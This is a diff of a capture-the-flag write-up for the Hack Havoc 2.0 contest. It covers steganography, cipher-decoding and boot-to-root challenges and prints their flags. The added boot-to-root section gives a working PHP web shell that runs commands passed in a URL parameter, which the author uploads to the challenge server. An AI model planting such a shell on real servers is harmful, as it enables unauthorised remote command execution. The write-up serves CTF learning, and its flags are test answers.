@@ -1,11 +1,11 @@
-**Welcome to Hack Havoc 2.0 CTF!**  
- Some how i liked  this ctf & Placed in 6TH Position.  
+****Welcome to Hack Havoc 2.0 CTF!**  
+Some how i liked  this ctf & Placed in 6TH Position.  
 **what Made me intrest ?**
 Prizes  
 PJPT Certification by TCM  
 HackTheBox Gift Voucher (3 Months VIP) + Ebook  
 Top 10 Participants: 1-hour Career Consultation with Cybersecurity Leader  
-Top 20 Participants: Access to internship opportunities at CyberMaterial and 911Cyber  
+Top 20 Participants: Access to internship opportunities at CyberMaterial and 911Cyber**  
 
 <img src="Images/CTF.jpg" alt="Challenge Image" width="200"/>
 
@@ -103,6 +103,7 @@ Finally after running this you will get to know this is password is ***7¡Vamos!
 ```bash
 steghide  steghide extract -sf file.jpg -p *7¡Vamos!
 cat flag.txt
+**CM{Bru73_f0rc3_i5_b35t}**
 ```
 
 <!-- -->
@@ -270,17 +271,74 @@ This challenge is as easy as it. I just pased this ( ╵⸍⸝╮ᛁ⸌ᛁ╵╵
 In Hint's they already menctioned this will be a 3 level encryption So i opned (dcode)[https://www.dcode.fr/cipher-identifier]
 
 - In Level one it detected it as Base 92 after decrypting i got this ZL{YfphiGdxdicgo_Yzkqu'i_Cmtg_Qfpdiscxawtiz_Xdxl_Khdxcltu}
-- Again i used dcode.fr this time it dected as Vigenere Cipher. But wait what it can be???? The only thing they highlighted  is CybermaterialHavoc
+- Again i used dcode.fr this time it dected as Vigenere Cipher. But wait what key can be???? The only thing they highlighted  is CybermaterialHavoc
   So i used it & then this decrypted to XN{XbyviNzgvirzo_Dliow'h_Yvhg_Xbyvihvxfirgb_Wzgz_Kozgulin}
 - Again i used decode.fr this dected as Atbash Cipher so i used it, this one provided me a flag **CM{CyberMaterial_World's_Best_Cybersecurity_Data_Platform}** another easy challenge 
 
 
 
 
+----
 
 
 
+**Category** - **Boot To Root**  
+**Challenge** - **Hacker's Fortress**  
 
+> In this boot-to-root exercise, participants will need to leverage their skills in file uploading and privilege escalation to uncover a hidden flag. The challenge simulates a real-world scenario where unauthorized access to a server must be achieved to find sensitive information.
+> 
+> http://35.208.110.64
+
+
+At starting i got fooled & tired many thing's like jpg, png, jpg for shell. That didn't worked. What i did is uploded a php shell 
+
+```php
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+```
+
+```HTML
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd'] . ' 2>&1');
+    }
+?>
+</pre>
+</body>
+</html>
+```
+ Just upload this & then open your uploded file in /uploads. And see what file are existing on server  & Hidden file tooo. **ls -a**
+Hheheh we got a flag   **CTF{3sc4l4t3d_t0_r00t}**
+
+
+
+-------
+
+**Category** - **web**  
+**Challenge** - **Hashing Numbers**
+
+
+> To access its secrets, you must first prove your worth by calculating a mathematical expression, a test of both intellect and skill. Will you rise to the challenge and secure the sensitive information, or will the secrets remain forever locked away? The choice is yours.
+
+> Flag structure: CM{XXX-###_##}
+>
+>https://sites.google.com/cybermaterial.com/hashing-numbers
+
+I was not able to figure out what to do`
 
 
 
